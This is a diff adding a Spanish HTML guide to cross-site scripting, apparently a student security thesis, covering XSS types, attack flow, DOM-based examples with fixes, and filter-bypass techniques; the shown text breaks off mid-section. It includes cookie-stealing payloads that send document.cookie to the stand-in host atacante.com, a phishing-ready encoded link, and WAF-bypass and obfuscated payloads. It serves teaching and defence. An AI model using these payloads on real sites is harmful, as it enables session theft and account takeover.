@@ -1,0 +1,1548 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Guía Avanzada de XSS para Profesionales | TFG Seguridad Web</title>
+  <!-- Bootstrap 5 + Icons -->
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.0/font/bootstrap-icons.css">
+<!-- Tema GitHub (claro) -->
+>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/styles/github-dark.min.css">
+  <style>
+    :root {
+      --primary-color: #4e73df;
+      --danger-color: #e74a3b;
+      --warning-color: #f6c23e;
+      --success-color: #1cc88a;
+      --dark-color: #5a5c69;
+    }
+    body {
+      font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+      background-color: #f8f9fc;
+      color: #333;
+      line-height: 1.6;
+    }
+    .sidebar {
+      width: 280px;
+      background: linear-gradient(180deg, #4e73df 0%, #224abe 100%);
+      color: white;
+      box-shadow: 4px 0 10px rgba(0,0,0,0.1);
+    }
+    .sidebar-brand {
+      height: 4.375rem;
+      text-decoration: none;
+      font-size: 1.2rem;
+      font-weight: 800;
+      padding: 1.5rem 1rem;
+      text-align: center;
+      letter-spacing: 0.05rem;
+      z-index: 1;
+    }
+    .nav-item {
+      position: relative;
+    }
+    .nav-link {
+      color: rgba(255, 255, 255, 0.8);
+      font-weight: 500;
+      padding: 0.75rem 1rem;
+      margin: 0 0.5rem;
+      border-radius: 0.35rem;
+    }
+    .nav-link:hover, .nav-link.active {
+      color: white;
+      background-color: rgba(255, 255, 255, 0.1);
+    }
+    .nav-link.active:before {
+      content: "";
+      position: absolute;
+      left: 0;
+      top: 0;
+      bottom: 0;
+      width: 4px;
+      background: white;
+      border-radius: 0 4px 4px 0;
+    }
+    main {
+      flex: 1;
+      padding: 2rem 3rem;
+      background-color: white;
+      box-shadow: 0 0.15rem 1.75rem 0 rgba(58, 59, 69, 0.15);
+      margin: 1.5rem;
+      border-radius: 0.5rem;
+    }
+    h1, h2, h3, h4, h5, h6 {
+      color: var(--dark-color);
+      font-weight: 700;
+    }
+    h2 {
+      margin-top: 3rem;
+      padding-bottom: 0.75rem;
+      border-bottom: 1px solid #e3e6f0;
+      position: relative;
+    }
+    h2:after {
+      content: "";
+      position: absolute;
+      left: 0;
+      bottom: -1px;
+      width: 100px;
+      height: 3px;
+      background: var(--primary-color);
+    }
+    .card {
+      border: none;
+      border-radius: 0.5rem;
+      box-shadow: 0 0.15rem 1.75rem 0 rgba(58, 59, 69, 0.1);
+      transition: transform 0.3s, box-shadow 0.3s;
+    }
+    .card:hover {
+      transform: translateY(-5px);
+      box-shadow: 0 0.5rem 2rem 0 rgba(58, 59, 69, 0.2);
+    }
+    .card-header {
+      background-color: #f8f9fc;
+      border-bottom: 1px solid #e3e6f0;
+      font-weight: 700;
+    }
+    .vulnerable-card {
+      border-left: 4px solid var(--danger-color);
+    }
+    .secure-card {
+      border-left: 4px solid var(--success-color);
+    }
+    pre {
+      position: relative;
+      border-radius: 0.35rem;
+      background-color: #3a6fdb;
+      padding: 1.5rem;
+    }
+    .copy-btn {
+      position: absolute;
+      top: 0.5rem;
+      right: 0.5rem;
+      background: rgba(255,255,255,0.1);
+      border: none;
+      color: #fff;
+      padding: 0.25rem 0.75rem;
+      border-radius: 0.25rem;
+      cursor: pointer;
+      transition: all 0.2s;
+      opacity: 0;
+    }
+    pre:hover .copy-btn {
+      opacity: 1;
+    }
+    .copy-btn:hover {
+      background: rgba(255,255,255,0.2);
+    }
+    .badge {
+      font-weight: 600;
+      padding: 0.35em 0.65em;
+    }
+    .impact-high {
+      background-color: var(--danger-color);
+    }
+    .impact-medium {
+      background-color: var(--warning-color);
+      color: #000;
+    }
+    .impact-low {
+      background-color: var(--success-color);
+    }
+    .search-box {
+      position: relative;
+      margin-bottom: 1.5rem;
+    }
+    .search-box i {
+      position: absolute;
+      left: 1rem;
+      top: 50%;
+      transform: translateY(-50%);
+      color: #b7b9cc;
+    }
+    .search-input {
+      padding-left: 2.5rem;
+      border-radius: 0.35rem;
+      border: 1px solid #d1d3e2;
+    }
+    .tab-content {
+      padding: 1.5rem 0;
+    }
+    .nav-tabs .nav-link {
+      color: var(--dark-color);
+      font-weight: 600;
+    }
+    .nav-tabs .nav-link.active {
+      color: var(--primary-color);
+      border-bottom: 3px solid var(--primary-color);
+    }
+    .floating-btn {
+      position: fixed;
+      bottom: 2rem;
+      right: 2rem;
+      width: 60px;
+      height: 60px;
+      border-radius: 50%;
+      background-color: var(--primary-color);
+      color: white;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      box-shadow: 0 0.5rem 1.5rem rgba(0,0,0,0.15);
+      z-index: 100;
+      cursor: pointer;
+      transition: all 0.3s;
+    }
+    .floating-btn:hover {
+      transform: scale(1.1);
+      box-shadow: 0 0.5rem 2rem rgba(0,0,0,0.2);
+    }
+    @media (max-width: 768px) {
+      body {
+        flex-direction: column;
+      }
+      .sidebar {
+        width: 100%;
+        height: auto;
+      }
+      main {
+        margin: 0;
+        padding: 1.5rem;
+      }
+    }
+  </style>
+  <!-- Security Headers -->
+  <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' https://cdn.jsdelivr.net; style-src 'self' https://cdn.jsdelivr.net; img-src 'self' data:; object-src 'none'; base-uri 'self'; form-action 'none'">
+  <meta http-equiv="X-Content-Type-Options" content="nosniff">
+  <meta http-equiv="X-Frame-Options" content="DENY">
+  <meta http-equiv="Referrer-Policy" content="no-referrer">
+</head>
+<body class="d-flex">
+  <!-- Sidebar Navigation -->
+  <nav class="sidebar d-flex flex-column">
+    <a class="sidebar-brand d-flex align-items-center justify-content-center mb-4" href="#">
+      <i class="bi bi-shield-lock me-2"></i>
+      <span>XSS Expert</span>
+    </a>
+    <div class="px-3">
+      <div class="search-box">
+        <i class="bi bi-search"></i>
+        <input type="text" class="form-control search-input" id="navSearch" placeholder="Buscar...">
+      </div>
+      <ul class="nav nav-pills flex-column mb-auto" id="navList">
+        <li class="nav-item"><a class="nav-link active" href="#intro"><i class="bi bi-house-door me-2"></i>Introducción</a></li>
+        <li class="nav-item"><a class="nav-link" href="#fundamentos"><i class="bi bi-book me-2"></i>Fundamentos</a></li>
+        <li class="nav-item"><a class="nav-link" href="#tipos"><i class="bi bi-diagram-3 me-2"></i>Tipos de XSS</a></li>
+        <li class="nav-item"><a class="nav-link" href="#attack-flow"><i class="bi bi-flowchart me-2"></i>Flujo de Ataque</a></li>
+        <li class="nav-item"><a class="nav-link" href="#payloads"><i class="bi bi-code-slash me-2"></i>Payloads</a></li>
+        <li class="nav-item"><a class="nav-link" href="#dom"><i class="bi bi-filetype-js me-2"></i>DOM-Based</a></li>
+        <li class="nav-item"><a class="nav-link" href="#avanzado"><i class="bi bi-shield-shaded me-2"></i>Técnicas Avanzadas</a></li>
+        <li class="nav-item"><a class="nav-link" href="#prevencion"><i class="bi bi-lock me-2"></i>Prevención</a></li>
+        <li class="nav-item"><a class="nav-link" href="#php-snippets"><i class="bi bi-filetype-php me-2"></i>Snippets PHP</a></li>
+        <li class="nav-item"><a class="nav-link" href="#laboratorio"><i class="bi bi-bug me-2"></i>Laboratorio</a></li>
+        <li class="nav-item"><a class="nav-link" href="#referencias"><i class="bi bi-bookmarks me-2"></i>Referencias</a></li>
+      </ul>
+    </div>
+    <div class="mt-auto p-3 text-center text-white-50 small">
+      <div>TFG Seguridad Web</div>
+      <div>© 2023 - Todos los derechos reservados</div>
+    </div>
+  </nav>
+
+  <!-- Main Content -->
+  <main class="flex-grow-1">
+    <!-- Intro Section -->
+    <section id="intro">
+      <div class="d-flex justify-content-between align-items-center mb-4">
+        <h1>Guía Profesional de XSS</h1>
+        <span class="badge bg-primary">TFG Seguridad Web</span>
+      </div>
+      
+      <div class="alert alert-primary d-flex align-items-center" role="alert">
+        <i class="bi bi-info-circle-fill me-2 fs-4"></i>
+        <div>
+          <strong>Objetivo:</strong> Documento profesional para identificar, explotar y mitigar vulnerabilidades XSS en aplicaciones web modernas.
+        </div>
+      </div>
+      
+      <p>Cross-Site Scripting (XSS) es una de las vulnerabilidades más críticas en la seguridad web, ocupando el puesto #3 en el <a href="https://owasp.org/www-project-top-ten/" target="_blank">OWASP Top 10</a>. Permite a atacantes inyectar scripts maliciosos que se ejecutan en el contexto de la aplicación, con graves consecuencias:</p>
+      
+      <div class="row g-3 mb-4">
+        <div class="col-md-4">
+          <div class="card h-100">
+            <div class="card-body">
+              <div class="d-flex align-items-center mb-3">
+                <div class="bg-danger bg-opacity-10 p-2 rounded me-3">
+                  <i class="bi bi-people-fill text-danger fs-4"></i>
+                </div>
+                <h5 class="mb-0">Robo de Sesiones</h5>
+              </div>
+              <p class="card-text">Captura de cookies y tokens de autenticación mediante JavaScript inyectado.</p>
+            </div>
+          </div>
+        </div>
+        <div class="col-md-4">
+          <div class="card h-100">
+            <div class="card-body">
+              <div class="d-flex align-items-center mb-3">
+                <div class="bg-warning bg-opacity-10 p-2 rounded me-3">
+                  <i class="bi bi-vector-pen text-warning fs-4"></i>
+                </div>
+                <h5 class="mb-0">Defacement</h5>
+              </div>
+              <p class="card-text">Modificación de contenido visible para engañar usuarios o dañar reputación.</p>
+            </div>
+          </div>
+        </div>
+        <div class="col-md-4">
+          <div class="card h-100">
+            <div class="card-body">
+              <div class="d-flex align-items-center mb-3">
+                <div class="bg-success bg-opacity-10 p-2 rounded me-3">
+                  <i class="bi bi-key-fill text-success fs-4"></i>
+                </div>
+                <h5 class="mb-0">Escalada de Privilegios</h5>
+              </div>
+              <p class="card-text">Ejecución de acciones como usuario autenticado mediante CSRF + XSS.</p>
+            </div>
+          </div>
+        </div>
+      </div>
+      
+      <h3>Impacto Empresarial</h3>
+      <p>Las vulnerabilidades XSS pueden tener consecuencias graves para las organizaciones:</p>
+      <ul>
+        <li><strong>Pérdidas financieras:</strong> Fraudes, robos de información sensible.</li>
+        <li><strong>Daño reputacional:</strong> Pérdida de confianza de clientes y socios.</li>
+        <li><strong>Multas regulatorias:</strong> Incumplimiento de GDPR, PCI DSS, etc.</li>
+        <li><strong>Costes de remediación:</strong> Investigación, parches, notificaciones.</li>
+      </ul>
+    </section>
+
+    <!-- Fundamentos Section -->
+    <section id="fundamentos">
+      <h2>Fundamentos de XSS</h2>
+      <div class="row">
+        <div class="col-lg-6">
+          <div class="card mb-4">
+            <div class="card-header">
+              <h5 class="mb-0">¿Por qué ocurre?</h5>
+            </div>
+            <div class="card-body">
+              <p>Las vulnerabilidades XSS surgen de:</p>
+              <ul>
+                <li>Falta de validación de entradas del usuario</li>
+                <li>Codificación incorrecta o ausente al mostrar datos</li>
+                <li>Confianza excesiva en datos del cliente</li>
+                <li>Manipulación insegura del DOM con datos no confiables</li>
+              </ul>
+            </div>
+          </div>
+        </div>
+        <div class="col-lg-6">
+          <div class="card mb-4">
+            <div class="card-header">
+              <h5 class="mb-0">Contextos de Inyección</h5>
+            </div>
+            <div class="card-body">
+              <p>Los vectores de ataque varían según el contexto:</p>
+              <ul>
+                <li><strong>HTML:</strong> Entre etiquetas o dentro de atributos</li>
+                <li><strong>JavaScript:</strong> Dentro de scripts o eventos</li>
+                <li><strong>URL:</strong> En parámetros o fragmentos</li>
+                <li><strong>CSS:</strong> En estilos dinámicos</li>
+                <li><strong>DOM:</strong> Manipulación directa del árbol</li>
+              </ul>
+            </div>
+          </div>
+        </div>
+      </div>
+      
+      <div class="alert alert-info d-flex align-items-center">
+        <i class="bi bi-lightbulb-fill me-2 fs-4"></i>
+        <div>
+          <strong>Same-Origin Policy (SOP):</strong> Un script inyectado hereda los permisos de la aplicación vulnerable, permitiendo acceso a cookies, tokens y acciones como el usuario autenticado.
+        </div>
+      </div>
+    </section>
+
+    <!-- Tipos Section -->
+    <section id="tipos">
+      <h2>Tipos de XSS</h2>
+      <div class="row g-3 mb-4">
+        <div class="col-md-4">
+          <div class="card h-100">
+            <div class="card-header d-flex align-items-center">
+              <i class="bi bi-database-fill me-2 text-danger"></i>
+              <h5 class="mb-0">Stored (Persistente)</h5>
+            </div>
+            <div class="card-body">
+              <p>El payload se almacena en el servidor (base de datos, logs, etc.) y se ejecuta cada vez que se carga la página afectada.</p>
+              <ul>
+                <li>Impacto: <span class="badge impact-high">Alto</span></li>
+                <li>Ejemplo: Comentarios, perfiles, mensajes</li>
+                <li>Detección: Más difícil (requiere persistencia)</li>
+              </ul>
+            </div>
+          </div>
+        </div>
+        <div class="col-md-4">
+          <div class="card h-100">
+            <div class="card-header d-flex align-items-center">
+              <i class="bi bi-arrow-left-right me-2 text-warning"></i>
+              <h5 class="mb-0">Reflected (No-persistente)</h5>
+            </div>
+            <div class="card-body">
+              <p>El payload viaja en la petición (URL, formulario) y se refleja inmediatamente en la respuesta sin almacenamiento.</p>
+              <ul>
+                <li>Impacto: <span class="badge impact-medium">Medio</span></li>
+                <li>Ejemplo: Búsquedas, errores, redirecciones</li>
+                <li>Detección: Más fácil (visible en URL)</li>
+              </ul>
+            </div>
+          </div>
+        </div>
+        <div class="col-md-4">
+          <div class="card h-100">
+            <div class="card-header d-flex align-items-center">
+              <i class="bi bi-filetype-js me-2 text-success"></i>
+              <h5 class="mb-0">DOM-Based</h5>
+            </div>
+            <div class="card-body">
+              <p>La vulnerabilidad reside en el JavaScript del cliente que manipula el DOM con datos no confiables sin sanitizar.</p>
+              <ul>
+                <li>Impacto: <span class="badge impact-medium">Medio-Alto</span></li>
+                <li>Ejemplo: Fragmentos URL, localStorage</li>
+                <li>Detección: Compleja (requiere análisis JS)</li>
+              </ul>
+            </div>
+          </div>
+        </div>
+      </div>
+      
+      <div class="card mb-4">
+        <div class="card-header">
+          <h5 class="mb-0">Comparativa de Tipos XSS</h5>
+        </div>
+        <div class="card-body">
+          <div class="table-responsive">
+            <table class="table table-bordered">
+              <thead class="table-light">
+                <tr>
+                  <th>Tipo</th>
+                  <th>Persistencia</th>
+                  <th>Detección</th>
+                  <th>Impacto</th>
+                  <th>Mitigación</th>
+                </tr>
+              </thead>
+              <tbody>
+                <tr>
+                  <td>Stored</td>
+                  <td><i class="bi bi-check-circle-fill text-success"></i> Persistente</td>
+                  <td><i class="bi bi-exclamation-triangle-fill text-warning"></i> Difícil</td>
+                  <td><span class="badge impact-high">Alto</span></td>
+                  <td>Validación servidor + sanitización</td>
+                </tr>
+                <tr>
+                  <td>Reflected</td>
+                  <td><i class="bi bi-x-circle-fill text-danger"></i> No persistente</td>
+                  <td><i class="bi bi-check-circle-fill text-success"></i> Fácil</td>
+                  <td><span class="badge impact-medium">Medio</span></td>
+                  <td>Codificación contextual</td>
+                </tr>
+                <tr>
+                  <td>DOM-Based</td>
+                  <td><i class="bi bi-question-circle-fill text-info"></i> Depende</td>
+                  <td><i class="bi bi-exclamation-triangle-fill text-warning"></i> Compleja</td>
+                  <td><span class="badge impact-medium">Medio-Alto</span></td>
+                  <td>Sanitización cliente + CSP</td>
+                </tr>
+              </tbody>
+            </table>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- Attack Flow Section -->
+    <section id="attack-flow">
+      <h2>Flujo de un Ataque XSS</h2>
+      <div class="card mb-4">
+        <div class="card-body">
+          <div class="row text-center">
+            <div class="col-md-2 mb-3 mb-md-0">
+              <div class="bg-primary bg-opacity-10 p-3 rounded-circle d-inline-block">
+                <i class="bi bi-search text-primary fs-2"></i>
+              </div>
+              <h5 class="mt-2">1. Descubrir</h5>
+              <p>Identificar puntos de inyección (inputs, parámetros, fragmentos URL)</p>
+            </div>
+            <div class="col-md-2 mb-3 mb-md-0">
+              <div class="bg-primary bg-opacity-10 p-3 rounded-circle d-inline-block">
+                <i class="bi bi-code-slash text-primary fs-2"></i>
+              </div>
+              <h5 class="mt-2">2. Construir</h5>
+              <p>Desarrollar payload JS adaptado al contexto (alert, robo cookies, keylogger)</p>
+            </div>
+            <div class="col-md-2 mb-3 mb-md-0">
+              <div class="bg-primary bg-opacity-10 p-3 rounded-circle d-inline-block">
+                <i class="bi bi-arrow-up-right text-primary fs-2"></i>
+              </div>
+              <h5 class="mt-2">3. Inyectar</h5>
+              <p>Reflected, Stored o DOM según la vulnerabilidad</p>
+            </div>
+            <div class="col-md-2 mb-3 mb-md-0">
+              <div class="bg-primary bg-opacity-10 p-3 rounded-circle d-inline-block">
+                <i class="bi bi-play-fill text-primary fs-2"></i>
+              </div>
+              <h5 class="mt-2">4. Ejecutar</h5>
+              <p>Al cargar página o interactuar con elemento vulnerable</p>
+            </div>
+            <div class="col-md-2 mb-3 mb-md-0">
+              <div class="bg-primary bg-opacity-10 p-3 rounded-circle d-inline-block">
+                <i class="bi bi-bug-fill text-primary fs-2"></i>
+              </div>
+              <h5 class="mt-2">5. Impacto</h5>
+              <p>Robo de sesión, defacement, acciones maliciosas</p>
+            </div>
+            <div class="col-md-2">
+              <div class="bg-primary bg-opacity-10 p-3 rounded-circle d-inline-block">
+                <i class="bi bi-shield-fill text-primary fs-2"></i>
+              </div>
+              <h5 class="mt-2">6. Mitigar</h5>
+              <p>Implementar contramedidas (CSP, sanitización, validación)</p>
+            </div>
+          </div>
+        </div>
+      </div>
+      
+      <h3>Ejemplo de Ataque Completo</h3>
+      <div class="card mb-4">
+        <div class="card-header">
+          <ul class="nav nav-tabs card-header-tabs" id="attackTab" role="tablist">
+            <li class="nav-item" role="presentation">
+              <button class="nav-link active" id="step1-tab" data-bs-toggle="tab" data-bs-target="#step1" type="button" role="tab">1. Identificación</button>
+            </li>
+            <li class="nav-item" role="presentation">
+              <button class="nav-link" id="step2-tab" data-bs-toggle="tab" data-bs-target="#step2" type="button" role="tab">2. Explotación</button>
+            </li>
+            <li class="nav-item" role="presentation">
+              <button class="nav-link" id="step3-tab" data-bs-toggle="tab" data-bs-target="#step3" type="button" role="tab">3. Impacto</button>
+            </li>
+          </ul>
+        </div>
+        <div class="card-body">
+          <div class="tab-content" id="attackTabContent">
+            <div class="tab-pane fade show active" id="step1" role="tabpanel">
+              <p>El atacante identifica un parámetro vulnerable en una aplicación web:</p>
+              <pre><code class="language-html">https://ejemplo.com/buscar?q=termino_busqueda</code></pre>
+              <p>Prueba con payloads básicos para confirmar vulnerabilidad:</p>
+              <pre><code class="language-html">https://ejemplo.com/buscar?q=&lt;script&gt;alert(1)&lt;/script&gt;</code></pre>
+            </div>
+            <div class="tab-pane fade" id="step2" role="tabpanel">
+              <p>Desarrolla un payload avanzado para robo de cookies:</p>
+              <pre><code class="language-javascript">// Payload para robo de cookies
+var img = new Image();
+img.src = 'https://atacante.com/steal?cookie=' + encodeURIComponent(document.cookie);</code></pre>
+              <p>Codifica el payload para inyección URL:</p>
+              <pre><code class="language-html">https://ejemplo.com/buscar?q=&lt;script&gt;var%20img=new%20Image;img.src='https://atacante.com/steal?cookie='%2BencodeURIComponent(document.cookie);&lt;/script&gt;</code></pre>
+            </div>
+            <div class="tab-pane fade" id="step3" role="tabpanel">
+              <p>El atacante distribuye el enlace a víctimas:</p>
+              <ul>
+                <li>Phishing por email</li>
+                <li>Mensajes en redes sociales</li>
+                <li>Comentarios en foros</li>
+              </ul>
+              <p>Cuando la víctima visita el enlace:</p>
+              <ol>
+                <li>Se ejecuta el script malicioso</li>
+                <li>Las cookies de sesión son enviadas al servidor del atacante</li>
+                <li>El atacante puede suplantar la sesión de la víctima</li>
+              </ol>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- Payloads Section -->
+    <section id="payloads">
+      <h2>Payloads XSS</h2>
+      
+      <div class="alert alert-warning d-flex align-items-center">
+        <i class="bi bi-exclamation-triangle-fill me-2 fs-4"></i>
+        <div>
+          <strong>Advertencia:</strong> Estos payloads son solo para pruebas de seguridad en entornos autorizados. Su uso no ético puede tener consecuencias legales.
+        </div>
+      </div>
+      
+      <div class="card mb-4">
+        <div class="card-header">
+          <h5 class="mb-0">Payloads Básicos</h5>
+        </div>
+        <div class="card-body">
+          <div class="table-responsive">
+            <table class="table table-bordered">
+              <thead class="table-light">
+                <tr>
+                  <th>Payload</th>
+                  <th>Contexto</th>
+                  <th>Descripción</th>
+                </tr>
+              </thead>
+              <tbody>
+                <tr>
+                  <td><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></td>
+                  <td>HTML</td>
+                  <td>Ejecución directa de JavaScript</td>
+                </tr>
+                <tr>
+                  <td><code>&lt;img src=x onerror=alert(1)&gt;</code></td>
+                  <td>Atributo HTML</td>
+                  <td>Ejecución mediante evento onerror</td>
+                </tr>
+                <tr>
+                  <td><code>javascript:alert(1)</code></td>
+                  <td>URL</td>
+                  <td>Protocolo javascript en enlaces</td>
+                </tr>
+                <tr>
+                  <td><code>"&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></td>
+                  <td>Atributo HTML</td>
+                  <td>Escape de atributo para inyección</td>
+                </tr>
+              </tbody>
+            </table>
+          </div>
+        </div>
+      </div>
+      
+      <div class="card mb-4">
+        <div class="card-header">
+          <h5 class="mb-0">Payloads Avanzados</h5>
+        </div>
+        <div class="card-body">
+          <div class="table-responsive">
+            <table class="table table-bordered">
+              <thead class="table-light">
+                <tr>
+                  <th>Payload</th>
+                  <th>Técnica</th>
+                  <th>Uso</th>
+                </tr>
+              </thead>
+              <tbody>
+                <tr>
+                  <td><code>&lt;svg/onload=alert(1)&gt;</code></td>
+                  <td>SVG Injection</td>
+                  <td>Bypass de filtros simples</td>
+                </tr>
+                <tr>
+                  <td><code>&lt;details/open/ontoggle=alert(1)&gt;</code></td>
+                  <td>HTML5 Abuse</td>
+                  <td>Nuevos vectores HTML5</td>
+                </tr>
+                <tr>
+                  <td><code>&lt;iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;"&gt;</code></td>
+                  <td>Iframe Injection</td>
+                  <td>Inyección en atributo srcdoc</td>
+                </tr>
+                <tr>
+                  <td><code>data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==</code></td>
+                  <td>Data URI</td>
+                  <td>Bypass de WAFs</td>
+                </tr>
+              </tbody>
+            </table>
+          </div>
+        </div>
+      </div>
+      
+      <div class="card">
+        <div class="card-header">
+          <h5 class="mb-0">Payloads para Robo de Cookies</h5>
+        </div>
+        <div class="card-body">
+          <pre><code class="language-javascript">// Versión básica
+&lt;script&gt;fetch('https://atacante.com/steal?cookie='+document.cookie)&lt;/script&gt;
+
+// Versión con encodificación
+&lt;script&gt;
+  var xhr = new XMLHttpRequest();
+  xhr.open('GET', 'https://atacante.com/steal?cookie='+encodeURIComponent(document.cookie), true);
+  xhr.send();
+&lt;/script&gt;
+
+// Versión stealth (oculta)
+&lt;img src=x onerror="this.src='https://atacante.com/steal?cookie='+encodeURIComponent(document.cookie);this.removeAttribute('onerror');"&gt;
+</code></pre>
+        </div>
+      </div>
+    </section>
+
+    <!-- DOM-Based Section -->
+    <section id="dom">
+      <h2>DOM-Based XSS</h2>
+      
+      <div class="card mb-4">
+        <div class="card-header">
+          <h5 class="mb-0">¿Qué es DOM-Based XSS?</h5>
+        </div>
+        <div class="card-body">
+          <p>Las vulnerabilidades DOM-Based XSS ocurren cuando JavaScript del lado del cliente escribe datos proporcionados por el usuario en el DOM sin la debida sanitización. A diferencia de XSS tradicional, el servidor no está involucrado en la inyección.</p>
+          
+          <div class="row">
+            <div class="col-md-6">
+              <h5>Flujo de DOM-Based XSS:</h5>
+              <ol>
+                <li>El usuario envía datos maliciosos (URL, formulario)</li>
+                <li>JavaScript los procesa sin sanitizar</li>
+                <li>Los datos se escriben en el DOM</li>
+                <li>El navegador interpreta el contenido como código</li>
+              </ol>
+            </div>
+            <div class="col-md-6">
+              <h5>Fuentes comunes:</h5>
+              <ul>
+                <li><code>location.hash</code></li>
+                <li><code>document.referrer</code></li>
+                <li><code>window.name</code></li>
+                <li><code>localStorage</code>/<code>sessionStorage</code></li>
+                <li>Mensajes postMessage</li>
+              </ul>
+            </div>
+          </div>
+        </div>
+      </div>
+      
+      <div class="card mb-4">
+        <div class="card-header">
+          <h5 class="mb-0">Ejemplos de Código Vulnerable</h5>
+        </div>
+        <div class="card-body">
+          <ul class="nav nav-tabs mb-3" id="domTab" role="tablist">
+            <li class="nav-item" role="presentation">
+              <button class="nav-link active" id="dom1-tab" data-bs-toggle="tab" data-bs-target="#dom1" type="button" role="tab">Ejemplo 1</button>
+            </li>
+            <li class="nav-item" role="presentation">
+              <button class="nav-link" id="dom2-tab" data-bs-toggle="tab" data-bs-target="#dom2" type="button" role="tab">Ejemplo 2</button>
+            </li>
+            <li class="nav-item" role="presentation">
+              <button class="nav-link" id="dom3-tab" data-bs-toggle="tab" data-bs-target="#dom3" type="button" role="tab">Ejemplo 3</button>
+            </li>
+          </ul>
+          <div class="tab-content" id="domTabContent">
+            <div class="tab-pane fade show active" id="dom1" role="tabpanel">
+              <pre><code class="language-javascript">// Vulnerable: Uso directo de location.hash
+document.getElementById('content').innerHTML = location.hash.substring(1);
+
+// Explotación:
+// http://ejemplo.com/#&lt;img src=x onerror=alert(1)&gt;</code></pre>
+            </div>
+            <div class="tab-pane fade" id="dom2" role="tabpanel">
+              <pre><code class="language-javascript">// Vulnerable: Evaluación dinámica
+var input = document.getElementById('search').value;
+eval('var result = ' + input + ';');
+
+// Explotación:
+// Ingresar: 1;alert(1)</code></pre>
+            </div>
+            <div class="tab-pane fade" id="dom3" role="tabpanel">
+              <pre><code class="language-javascript">// Vulnerable: jQuery inseguro
+var user = $.getUrlParam('user');
+$('div.profile').html('Hola ' + user);
+
+// Explotación:
+// http://ejemplo.com/?user=&lt;script&gt;alert(1)&lt;/script&gt;</code></pre>
+            </div>
+          </div>
+        </div>
+      </div>
+      
+      <div class="card">
+        <div class="card-header">
+          <h5 class="mb-0">Mitigación de DOM-Based XSS</h5>
+        </div>
+        <div class="card-body">
+          <div class="row">
+            <div class="col-md-6">
+              <h5>Métodos Seguros:</h5>
+              <ul>
+                <li><code>textContent</code> en lugar de <code>innerHTML</code></li>
+                <li><code>setAttribute</code> para atributos</li>
+                <li><code>document.createElement</code> para nodos</li>
+                <li>Librerías como DOMPurify</li>
+              </ul>
+            </div>
+            <div class="col-md-6">
+              <h5>Ejemplo Seguro:</h5>
+              <pre><code class="language-javascript">// Seguro: Usando textContent
+document.getElementById('content').textContent = location.hash.substring(1);
+
+// Seguro: Sanitización con DOMPurify
+document.getElementById('content').innerHTML = DOMPurify.sanitize(userInput);</code></pre>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- Técnicas Avanzadas Section -->
+    <section id="avanzado">
+      <h2>Técnicas Avanzadas & Bypass</h2>
+      
+      <div class="card mb-4">
+        <div class="card-header">
+          <h5 class="mb-0">Bypass de Filtros y WAFs</h5>
+        </div>
+        <div class="card-body">
+          <div class="table-responsive">
+            <table class="table table-bordered">
+              <thead class="table-light">
+                <tr>
+                  <th>Técnica</th>
+                  <th>Ejemplo</th>
+                  <th>Descripción</th>
+                </tr>
+              </thead>
+              <tbody>
+                <tr>
+                  <td>Codificación</td>
+                  <td><code>&amp;#x3C;script&amp;#x3E;alert(1)&amp;#x3C;/script&amp;#x3E;</code></td>
+                  <td>Entidades HTML</td>
+                </tr>
+                <tr>
+                  <td>Double Encoding</td>
+                  <td><code>%253Cscript%253Ealert(1)%253C%252Fscript%253E</code></td>
+                  <td>Codificar dos veces</td>
+                </tr>
+                <tr>
+                  <td>JavaScript Unicode</td>
+                  <td><code>\u0061lert(1)</code></td>
+                  <td>Escape Unicode</td>
+                </tr>
+                <tr>
+                  <td>String Concatenation</td>
+                  <td><code>&lt;img src=x onerror="a='aler';b='t(1)';window[a+b]();"&gt;</code></td>
+                  <td>Concatenar strings</td>
+                </tr>
+              </tbody>
+            </table>
+          </div>
+        </div>
+      </div>
+      
+      <div class="card mb-4">
+        <div class="card-header">
+          <h5 class="mb-0">Técnicas de Ofuscación</h5>
+        </div>
+        <div class="card-body">
+          <pre><code class="language-javascript">// Ofuscación con Base64
+eval(atob('YWxlcnQoMSk='));  // alert(1)
+
+// Ofuscación con JSFuck
+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[!+[]+!+[]+[+[]]]+[+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[!+[]+!+[]+[+[]]])()</code></pre>
+        </div>
+      </div>
+      
+      <div class="card">
